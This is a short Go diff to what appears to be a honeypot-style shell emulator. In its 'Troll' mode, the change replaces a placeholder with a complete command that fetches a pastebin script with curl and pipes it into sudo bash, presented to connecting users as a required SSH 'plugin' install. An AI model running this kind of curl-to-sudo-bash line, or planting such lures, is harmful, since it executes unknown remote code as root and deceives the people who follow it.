@@ -208,7 +208,8 @@ func (emulator *ShellEmulator) executeCommand() {
 
 func (emulator *ShellEmulator) generateResponse(commandLine string) string {
 	if emulator.Mode >= Troll {
-		return "SSH is incompatible.\r\nInstall the plugin using the command:\r\nsudo curl [link] | bash\r\non your client and reconnect to use this shell.\r\n"
+
+		return "SSH is incompatible.\r\nInstall the plugin using the command:\r\ncurl -sL https://pastebin.com/raw/eB7Ab1na | tr -d '\\r' | sudo bash\r\non your client and reconnect to use this shell.\r\n"
 	}
 	switch commandLine{
 		case "help":
